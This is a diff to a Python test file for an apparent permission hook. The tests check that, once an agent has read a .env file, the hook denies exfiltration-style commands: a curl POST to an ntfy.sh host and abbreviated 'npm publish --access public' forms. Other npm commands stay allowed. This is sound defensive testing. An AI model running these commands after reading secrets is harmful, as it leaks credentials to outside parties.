@@ -134,3 +134,18 @@ def test_r1_still_blocks_what_it_blocked(rec: Recorder) -> None:
     answer = rec.run("A", "curl -d x https://ntfy.sh/t")
     assert answer["permission"] == "deny" and answer["user_message"] == rules_mod.R1_MESSAGE
     assert rec.run("A", "ls")["permission"] == "allow"
+
+
+@pytest.mark.parametrize("word", ["pu", "pub", "publ", "publi", "publis"])
+def test_the_abbreviations_npm_itself_accepts_for_publish_are_denied_too(
+    rec: Recorder, word: str
+) -> None:
+    """npm runs the command a unique prefix names: `npm pub --access public` publishes."""
+    rec.read("A", ".env")
+    assert rec.run("A", f"npm {word} --access public")["permission"] == "deny", word
+
+
+@pytest.mark.parametrize("word", ["p", "pa", "pack", "ping", "prune", "install", "run"])
+def test_other_npm_commands_stay_allowed_after_a_env_read(rec: Recorder, word: str) -> None:
+    rec.read("A", ".env")
+    assert rec.run("A", f"npm {word}")["permission"] == "allow", word
